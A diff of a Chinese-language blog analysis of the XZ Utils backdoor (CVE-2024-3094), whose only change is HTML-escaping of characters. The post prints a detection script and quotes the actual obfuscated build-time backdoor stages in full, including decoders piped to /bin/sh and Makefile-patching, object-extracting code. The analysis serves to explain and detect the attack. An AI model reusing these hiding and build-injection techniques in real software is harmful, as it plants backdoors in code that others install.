@@ -2,7 +2,7 @@
 
 
 
-<!--more-->
+&lt;!--more--&gt;
 ## XZ Utilѕ 工具库 恶意后门植入漏洞 (CVE-2024-3094)
 
 ## 漏洞介绍
@@ -70,15 +70,15 @@ liblzma 5.6.1
 #! /bin/bash
 set -eu
 # find path to liblzma used by sshd
-path="$(ldd $(which sshd) | grep liblzma | grep -o '/[^ ]*')"
+path=&#34;$(ldd $(which sshd) | grep liblzma | grep -o &#39;/[^ ]*&#39;)&#34;
 # does it even exist?
-if [ "$path" == "" ]
+if [ &#34;$path&#34; == &#34;&#34; ]
 then
 echo probably not vulnerable
 exit
 fi
 # check for function signature
-if hexdump -ve '1/1 "%.2x"' "$path" | grep -q
+if hexdump -ve &#39;1/1 &#34;%.2x&#34;&#39; &#34;$path&#34; | grep -q
 f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410
 then
 echo probably vulnerable
@@ -105,7 +105,7 @@ https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266
 
 故事大概是：
 
-OpenSSH依赖一个名为liblzma(xz)的小众开源压缩库，攻击者虚构了一个名为"Jia Tan"的开发者身份，从2021年10月开始为xz项目积极做开发维护贡献，逐渐获得信任。
+OpenSSH依赖一个名为liblzma(xz)的小众开源压缩库，攻击者虚构了一个名为&#34;Jia Tan&#34;的开发者身份，从2021年10月开始为xz项目积极做开发维护贡献，逐渐获得信任。
 
 最终接管了维护工作后，在构建脚本中逐步加入一个复杂隐蔽并复杂混淆的后门，而且是几个月内慢慢的添加所有组件，组合成了完整的后门，接着还联系Linux发行版维护人员，试图让带后门的xz库被打包分发给所有用户，直到微软员工Andres Freund因调查SSH延迟问题发现了此事。
 
@@ -183,9 +183,9 @@ Andres Freund 邮件原文有后门程序的详细分析，但由于发现者不
 
 ```sh
 ...
-gl_[$1]_config='sed \"r\n\" $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2>/dev/null'
+gl_[$1]_config=&#39;sed \&#34;r\n\&#34; $gl_am_configmake | eval $gl_path_map | $gl_[$1]_prefix -d 2&gt;/dev/null&#39;
 ...
-gl_path_map='tr "\t \-_" " \t_\-"'
+gl_path_map=&#39;tr &#34;\t \-_&#34; &#34; \t_\-&#34;&#39;
 ...
 ```
 
@@ -195,7 +195,7 @@ gl_path_map='tr "\t \-_" " \t_\-"'
 
 这段代码在构建过程中的某个地方运行，提取第一阶段脚本。概述如下：
 
-1. `sed \"r\n\" $gl_am_configmake`：读取 `tests/files/bad-3-corrupt_lzma2.xz `文件中的字节，并用作下一步的输入。读取完所有内容后，会添加换行符`\n`;
+1. `sed \&#34;r\n\&#34; $gl_am_configmake`：读取 `tests/files/bad-3-corrupt_lzma2.xz `文件中的字节，并用作下一步的输入。读取完所有内容后，会添加换行符`\n`;
 2. 运行 tr 命令，进行字符替换，将选定的字符更改为其他字符，将制表符`\t`、空格`\ `、连字符`-`、下划线`_`，依次替换为了空格`\ `、制表符`\t`、下划线`_`、连字符`-`，它对`tests/files/bad-3-corrupt_lzma2.xz` 文件中的字节进行替换，这使得 bad-3-corrupt_lzma2.xz 再次形成了正确的 xz 流。
 3. 在此阶段的最后一步中，提取固定的 xz 字节流，并忽略错误（该流似乎被截断，但这并不重要，因为整个有意义的输出已被写出）。其结果是Stage 1的脚本，该脚本会立即执行。
 
@@ -209,18 +209,18 @@ gl_path_map='tr "\t \-_" " \t_\-"'
 
 ```sh
 ####Hello####
-# a few binary bytes here, but as it's a comment they are ignorred
-[ ! $(uname) = "Linux" ] && exit 0
-[ ! $(uname) = "Linux" ] && exit 0
-[ ! $(uname) = "Linux" ] && exit 0
-[ ! $(uname) = "Linux" ] && exit 0
-[ ! $(uname) = "Linux" ] && exit 0
+# a few binary bytes here, but as it&#39;s a comment they are ignorred
+[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
+[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
+[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
+[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
+[ ! $(uname) = &#34;Linux&#34; ] &amp;&amp; exit 0
 eval `grep ^srcdir= config.status`
 if test -f ../../config.status;then
 eval `grep ^srcdir= ../../config.status`
-srcdir="../../$srcdir"
+srcdir=&#34;../../$srcdir&#34;
 fi
-export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
+export i=&#34;((head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;939)&#34;;(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c &#43;31233|tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34;)|xz -F raw --lzma1 -dc|/bin/sh
 ####World####
 ```
 
@@ -233,9 +233,9 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/n
 先分析第 2 阶段提取代码，即带有很多head的`export i=... `行。进行简单拆分：
 
 ```sh
-export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +939)";
+export i=&#34;((head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;2048 &amp;&amp; (head -c &#43;1024 &gt;/dev/null) &amp;&amp; head -c &#43;939)&#34;;
 
-(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c +31233|tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377")|xz -F raw --lzma1 -dc|/bin/sh
+(xz -dc $srcdir/tests/files/good-large_compressed.lzma|eval $i|tail -c &#43;31233|tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34;)|xz -F raw --lzma1 -dc|/bin/sh
 ```
 
 
@@ -244,15 +244,15 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/n
 
 2. 第 2 步是将 `good-large_compressed.lzma` 文件解压缩到标准输出 (xz -dc) ，并用作下一步的输入；
 
-3. 然后会调用 i 函数 (`eval $i`)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节（`head -c +N`），要么跳过接下来的 N 个字节（`head -c +N >/dev/null`）。i 函数最终实现：忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节...依此类推，直到到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。
+3. 然后会调用 i 函数 (`eval $i`)。该函数基本上是一系列head调用，要么输出接下来的 N 个字节（`head -c &#43;N`），要么跳过接下来的 N 个字节（`head -c &#43;N &gt;/dev/null`）。i 函数最终实现：忽略 1024 个字节，再输出 2048 个字节，忽略 1024 个字节，再输出 2048 个字节...依此类推，直到到达文件的最末尾，其中只有 724 个字节（在 5.6.0 中）或 939输出字节（在 5.6.1 中）。
 
-4. 接下去执行 `tail -c +31233 `忽略数据的初始部分（`tail -c +N` 表示“从字节 N 开始输出”，注：初始部分隐藏了二进制后门，会将在下一阶段中提取）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 。
+4. 接下去执行 `tail -c &#43;31233 `忽略数据的初始部分（`tail -c &#43;N` 表示“从字节 N 开始输出”，注：初始部分隐藏了二进制后门，会将在下一阶段中提取）。在 5.6.0 中，这将是前 31264 个字节，在 5.6.1 中是 31232 。
 
 5. 第5步执行 tr 命令，用作简单的替换密码，密钥（字节值映射）在 5.6.0 和 5.6.1 中不同，两种情况下，都有 6 个范围映射到整个 0 - 255（即八进制 377）范围。
 
    ```sh
-   5.6.0: tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377"
-   5.6.1: tr "\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113" "\0-\377"
+   5.6.0: tr &#34;\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131&#34; &#34;\0-\377&#34;
+   5.6.1: tr &#34;\114-\321\322-\377\35-\47\14-\34\0-\13\50-\113&#34; &#34;\0-\377&#34;
    ```
 
 6. 在最后一步中，解密的数据被解压缩（`xz -F raw --lzma1 -dc`），并且立即执行Stage 2。
@@ -262,195 +262,195 @@ export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/n
 ![image-20240406212656571](resource/xz库恶意后门植入事件.assets/image-20240406212656571.png)
 
 ```sh
-P="-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections"
-C="pic_flag=\" $P\""
-O="^pic_flag=\" -fPIC -DPIC\"$"
-R="is_arch_extension_supported"
-x="__get_cpuid("
-p="good-large_compressed.lzma"
-U="bad-3-corrupt_lzma2.xz"
+P=&#34;-fPIC -DPIC -fno-lto -ffunction-sections -fdata-sections&#34;
+C=&#34;pic_flag=\&#34; $P\&#34;&#34;
+O=&#34;^pic_flag=\&#34; -fPIC -DPIC\&#34;$&#34;
+R=&#34;is_arch_extension_supported&#34;
+x=&#34;__get_cpuid(&#34;
+p=&#34;good-large_compressed.lzma&#34;
+U=&#34;bad-3-corrupt_lzma2.xz&#34;
 eval $zrKcVq
 if test -f config.status; then
 eval $zrKcSS
-eval `grep ^LD=\'\/ config.status`
-eval `grep ^CC=\' config.status`
-eval `grep ^GCC=\' config.status`
-eval `grep ^srcdir=\' config.status`
-eval `grep ^build=\'x86_64 config.status`
-eval `grep ^enable_shared=\'yes\' config.status`
-eval `grep ^enable_static=\' config.status`
-eval `grep ^gl_path_map=\' config.status`
+eval `grep ^LD=\&#39;\/ config.status`
+eval `grep ^CC=\&#39; config.status`
+eval `grep ^GCC=\&#39; config.status`
+eval `grep ^srcdir=\&#39; config.status`
+eval `grep ^build=\&#39;x86_64 config.status`
+eval `grep ^enable_shared=\&#39;yes\&#39; config.status`
+eval `grep ^enable_static=\&#39; config.status`
+eval `grep ^gl_path_map=\&#39; config.status`
 eval $zrKccj
-if ! grep -qs '\["HAVE_FUNC_ATTRIBUTE_IFUNC"\]=" 1"' config.status > /dev/null 2>&1;then
+if ! grep -qs &#39;\[&#34;HAVE_FUNC_ATTRIBUTE_IFUNC&#34;\]=&#34; 1&#34;&#39; config.status &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if ! grep -qs 'define HAVE_FUNC_ATTRIBUTE_IFUNC 1' config.h > /dev/null 2>&1;then
+if ! grep -qs &#39;define HAVE_FUNC_ATTRIBUTE_IFUNC 1&#39; config.h &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if test "x$enable_shared" != "xyes";then
+if test &#34;x$enable_shared&#34; != &#34;xyes&#34;;then
 exit 0
 fi
-if ! (echo "$build" | grep -Eq "^x86_64" > /dev/null 2>&1) && (echo "$build" | grep -Eq "linux-gnu$" > /dev/null 2>&1);then
+if ! (echo &#34;$build&#34; | grep -Eq &#34;^x86_64&#34; &gt; /dev/null 2&gt;&amp;1) &amp;&amp; (echo &#34;$build&#34; | grep -Eq &#34;linux-gnu$&#34; &gt; /dev/null 2&gt;&amp;1);then
 exit 0
 fi
-if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc64_fast.c > /dev/null 2>&1; then
+if ! grep -qs &#34;$R()&#34; $srcdir/src/liblzma/check/crc64_fast.c &gt; /dev/null 2&gt;&amp;1; then
 exit 0
 fi
-if ! grep -qs "$R()" $srcdir/src/liblzma/check/crc32_fast.c > /dev/null 2>&1; then
+if ! grep -qs &#34;$R()&#34; $srcdir/src/liblzma/check/crc32_fast.c &gt; /dev/null 2&gt;&amp;1; then
 exit 0
 fi
-if ! grep -qs "$R" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+if ! grep -qs &#34;$R&#34; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
 exit 0
 fi
-if ! grep -qs "$x" $srcdir/src/liblzma/check/crc_x86_clmul.h > /dev/null 2>&1; then
+if ! grep -qs &#34;$x&#34; $srcdir/src/liblzma/check/crc_x86_clmul.h &gt; /dev/null 2&gt;&amp;1; then
 exit 0
 fi
-if test "x$GCC" != 'xyes' > /dev/null 2>&1;then
+if test &#34;x$GCC&#34; != &#39;xyes&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if test "x$CC" != 'xgcc' > /dev/null 2>&1;then
+if test &#34;x$CC&#34; != &#39;xgcc&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-LDv=$LD" -v"
-if ! $LDv 2>&1 | grep -qs 'GNU ld' > /dev/null 2>&1;then
+LDv=$LD&#34; -v&#34;
+if ! $LDv 2&gt;&amp;1 | grep -qs &#39;GNU ld&#39; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if ! test -f "$srcdir/tests/files/$p" > /dev/null 2>&1;then
+if ! test -f &#34;$srcdir/tests/files/$p&#34; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if ! test -f "$srcdir/tests/files/$U" > /dev/null 2>&1;then
+if ! test -f &#34;$srcdir/tests/files/$U&#34; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if test -f "$srcdir/debian/rules" || test "x$RPM_ARCH" = "xx86_64";then
+if test -f &#34;$srcdir/debian/rules&#34; || test &#34;x$RPM_ARCH&#34; = &#34;xx86_64&#34;;then
 eval $zrKcst
-j="^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4"
-if ! grep -qs "$j" src/liblzma/Makefile > /dev/null 2>&1;then
+j=&#34;^ACLOCAL_M4 = \$(top_srcdir)\/aclocal.m4&#34;
+if ! grep -qs &#34;$j&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-z="^am__uninstall_files_from_dir = {"
-if ! grep -qs "$z" src/liblzma/Makefile > /dev/null 2>&1;then
+z=&#34;^am__uninstall_files_from_dir = {&#34;
+if ! grep -qs &#34;$z&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-w="^am__install_max ="
-if ! grep -qs "$w" src/liblzma/Makefile > /dev/null 2>&1;then
+w=&#34;^am__install_max =&#34;
+if ! grep -qs &#34;$w&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
 E=$z
-if ! grep -qs "$E" src/liblzma/Makefile > /dev/null 2>&1;then
+if ! grep -qs &#34;$E&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-Q="^am__vpath_adj_setup ="
-if ! grep -qs "$Q" src/liblzma/Makefile > /dev/null 2>&1;then
+Q=&#34;^am__vpath_adj_setup =&#34;
+if ! grep -qs &#34;$Q&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-M="^am__include = include"
-if ! grep -qs "$M" src/liblzma/Makefile > /dev/null 2>&1;then
+M=&#34;^am__include = include&#34;
+if ! grep -qs &#34;$M&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-L="^all: all-recursive$"
-if ! grep -qs "$L" src/liblzma/Makefile > /dev/null 2>&1;then
+L=&#34;^all: all-recursive$&#34;
+if ! grep -qs &#34;$L&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-m="^LTLIBRARIES = \$(lib_LTLIBRARIES)"
-if ! grep -qs "$m" src/liblzma/Makefile > /dev/null 2>&1;then
+m=&#34;^LTLIBRARIES = \$(lib_LTLIBRARIES)&#34;
+if ! grep -qs &#34;$m&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-u="AM_V_CCLD = \$(am__v_CCLD_\$(V))"
-if ! grep -qs "$u" src/liblzma/Makefile > /dev/null 2>&1;then
+u=&#34;AM_V_CCLD = \$(am__v_CCLD_\$(V))&#34;
+if ! grep -qs &#34;$u&#34; src/liblzma/Makefile &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if ! grep -qs "$O" libtool > /dev/null 2>&1;then
+if ! grep -qs &#34;$O&#34; libtool &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
 eval $zrKcTy
-b="am__test = $U"
-sed -i "/$j/i$b" src/liblzma/Makefile || true
-d=`echo $gl_path_map | sed 's/\\\/\\\\\\\\/g'`
-b="am__strip_prefix = $d"
-sed -i "/$w/i$b" src/liblzma/Makefile || true
-b="am__dist_setup = \$(am__strip_prefix) | xz -d 2>/dev/null | \$(SHELL)"
-sed -i "/$E/i$b" src/liblzma/Makefile || true
-b="\$(top_srcdir)/tests/files/\$(am__test)"
-s="am__test_dir=$b"
-sed -i "/$Q/i$s" src/liblzma/Makefile || true
-h="-Wl,--sort-section=name,-X"
-if ! echo "$LDFLAGS" | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
-h=$h",-z,now"
+b=&#34;am__test = $U&#34;
+sed -i &#34;/$j/i$b&#34; src/liblzma/Makefile || true
+d=`echo $gl_path_map | sed &#39;s/\\\/\\\\\\\\/g&#39;`
+b=&#34;am__strip_prefix = $d&#34;
+sed -i &#34;/$w/i$b&#34; src/liblzma/Makefile || true
+b=&#34;am__dist_setup = \$(am__strip_prefix) | xz -d 2&gt;/dev/null | \$(SHELL)&#34;
+sed -i &#34;/$E/i$b&#34; src/liblzma/Makefile || true
+b=&#34;\$(top_srcdir)/tests/files/\$(am__test)&#34;
+s=&#34;am__test_dir=$b&#34;
+sed -i &#34;/$Q/i$s&#34; src/liblzma/Makefile || true
+h=&#34;-Wl,--sort-section=name,-X&#34;
+if ! echo &#34;$LDFLAGS&#34; | grep -qs -e &#34;-z,now&#34; -e &#34;-z -Wl,now&#34; &gt; /dev/null 2&gt;&amp;1;then
+h=$h&#34;,-z,now&#34;
 fi
-j="liblzma_la_LDFLAGS += $h"
-sed -i "/$L/i$j" src/liblzma/Makefile || true
-sed -i "s/$O/$C/g" libtool || true
-k="AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))"
-sed -i "s/$u/$k/" src/liblzma/Makefile || true
-l="LTDEPS='\$(lib_LTDEPS)'; \\\\\n\
-    export top_srcdir='\$(top_srcdir)'; \\\\\n\
-    export CC='\$(CC)'; \\\\\n\
-    export DEFS='\$(DEFS)'; \\\\\n\
-    export DEFAULT_INCLUDES='\$(DEFAULT_INCLUDES)'; \\\\\n\
-    export INCLUDES='\$(INCLUDES)'; \\\\\n\
-    export liblzma_la_CPPFLAGS='\$(liblzma_la_CPPFLAGS)'; \\\\\n\
-    export CPPFLAGS='\$(CPPFLAGS)'; \\\\\n\
-    export AM_CFLAGS='\$(AM_CFLAGS)'; \\\\\n\
-    export CFLAGS='\$(CFLAGS)'; \\\\\n\
-    export AM_V_CCLD='\$(am__v_CCLD_\$(V))'; \\\\\n\
-    export liblzma_la_LINK='\$(liblzma_la_LINK)'; \\\\\n\
-    export libdir='\$(libdir)'; \\\\\n\
-    export liblzma_la_OBJECTS='\$(liblzma_la_OBJECTS)'; \\\\\n\
-    export liblzma_la_LIBADD='\$(liblzma_la_LIBADD)'; \\\\\n\
-sed rpath \$(am__test_dir) | \$(am__dist_setup) >/dev/null 2>&1";
-sed -i "/$m/i$l" src/liblzma/Makefile || true
+j=&#34;liblzma_la_LDFLAGS &#43;= $h&#34;
+sed -i &#34;/$L/i$j&#34; src/liblzma/Makefile || true
+sed -i &#34;s/$O/$C/g&#34; libtool || true
+k=&#34;AM_V_CCLD = @echo -n \$(LTDEPS); \$(am__v_CCLD_\$(V))&#34;
+sed -i &#34;s/$u/$k/&#34; src/liblzma/Makefile || true
+l=&#34;LTDEPS=&#39;\$(lib_LTDEPS)&#39;; \\\\\n\
+    export top_srcdir=&#39;\$(top_srcdir)&#39;; \\\\\n\
+    export CC=&#39;\$(CC)&#39;; \\\\\n\
+    export DEFS=&#39;\$(DEFS)&#39;; \\\\\n\
+    export DEFAULT_INCLUDES=&#39;\$(DEFAULT_INCLUDES)&#39;; \\\\\n\
+    export INCLUDES=&#39;\$(INCLUDES)&#39;; \\\\\n\
+    export liblzma_la_CPPFLAGS=&#39;\$(liblzma_la_CPPFLAGS)&#39;; \\\\\n\
+    export CPPFLAGS=&#39;\$(CPPFLAGS)&#39;; \\\\\n\
+    export AM_CFLAGS=&#39;\$(AM_CFLAGS)&#39;; \\\\\n\
+    export CFLAGS=&#39;\$(CFLAGS)&#39;; \\\\\n\
+    export AM_V_CCLD=&#39;\$(am__v_CCLD_\$(V))&#39;; \\\\\n\
+    export liblzma_la_LINK=&#39;\$(liblzma_la_LINK)&#39;; \\\\\n\
+    export libdir=&#39;\$(libdir)&#39;; \\\\\n\
+    export liblzma_la_OBJECTS=&#39;\$(liblzma_la_OBJECTS)&#39;; \\\\\n\
+    export liblzma_la_LIBADD=&#39;\$(liblzma_la_LIBADD)&#39;; \\\\\n\
+sed rpath \$(am__test_dir) | \$(am__dist_setup) &gt;/dev/null 2&gt;&amp;1&#34;;
+sed -i &#34;/$m/i$l&#34; src/liblzma/Makefile || true
 eval $zrKcHD
 fi
-elif (test -f .libs/liblzma_la-crc64_fast.o) && (test -f .libs/liblzma_la-crc32_fast.o); then
+elif (test -f .libs/liblzma_la-crc64_fast.o) &amp;&amp; (test -f .libs/liblzma_la-crc32_fast.o); then
 eval $zrKcKQ
-if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc64_fast.c; then
+if ! grep -qs &#34;$R()&#34; $top_srcdir/src/liblzma/check/crc64_fast.c; then
 exit 0
 fi
-if ! grep -qs "$R()" $top_srcdir/src/liblzma/check/crc32_fast.c; then
+if ! grep -qs &#34;$R()&#34; $top_srcdir/src/liblzma/check/crc32_fast.c; then
 exit 0
 fi
-if ! grep -qs "$R" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+if ! grep -qs &#34;$R&#34; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
 exit 0
 fi
-if ! grep -qs "$x" $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
+if ! grep -qs &#34;$x&#34; $top_srcdir/src/liblzma/check/crc_x86_clmul.h; then
 exit 0
 fi
-if ! grep -qs "$C" ../../libtool; then
+if ! grep -qs &#34;$C&#34; ../../libtool; then
 exit 0
 fi
-if ! echo $liblzma_la_LINK | grep -qs -e "-z,now" -e "-z -Wl,now" > /dev/null 2>&1;then
+if ! echo $liblzma_la_LINK | grep -qs -e &#34;-z,now&#34; -e &#34;-z -Wl,now&#34; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
-if echo $liblzma_la_LINK | grep -qs -e "lazy" > /dev/null 2>&1;then
+if echo $liblzma_la_LINK | grep -qs -e &#34;lazy&#34; &gt; /dev/null 2&gt;&amp;1;then
 exit 0
 fi
 N=0
 W=0
-Y=`grep "dnl Convert it to C string syntax." $top_srcdir/m4/gettext.m4`
+Y=`grep &#34;dnl Convert it to C string syntax.&#34; $top_srcdir/m4/gettext.m4`
 eval $zrKcjv
-if test -z "$Y"; then
+if test -z &#34;$Y&#34;; then
 N=0
 W=88792
 else
 N=88792
 W=0
 fi
-xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
+xz -dc $top_srcdir/tests/files/$p | eval $i | LC_ALL=C sed &#34;s/\(.\)/\1\n/g&#34; | LC_ALL=C awk &#39;BEGIN{FS=&#34;\n&#34;;RS=&#34;\n&#34;;ORS=&#34;&#34;;m=256;for(i=0;i&lt;m;i&#43;&#43;){t[sprintf(&#34;x%c&#34;,i)]=i;c[i]=((i*7)&#43;5)%m;}i=0;j=0;for(l=0;l&lt;4096;l&#43;&#43;){i=(i&#43;1)%m;a=c[i];j=(j&#43;a)%m;c[i]=c[j];c[j]=a;}}{v=t[&#34;x&#34; (NF&lt;1?RS:$1)];i=(i&#43;1)%m;a=c[i];j=(j&#43;a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a&#43;b)%m];printf &#34;%c&#34;,(v&#43;k)%m}&#39; | xz -dc --single-stream | ((head -c &#43;$N &gt; /dev/null 2&gt;&amp;1) &amp;&amp; head -c &#43;$W) &gt; liblzma_la-crc64-fast.o || true
 if ! test -f liblzma_la-crc64-fast.o; then
 exit 0
 fi
 cp .libs/liblzma_la-crc64_fast.o .libs/liblzma_la-crc64-fast.o || true
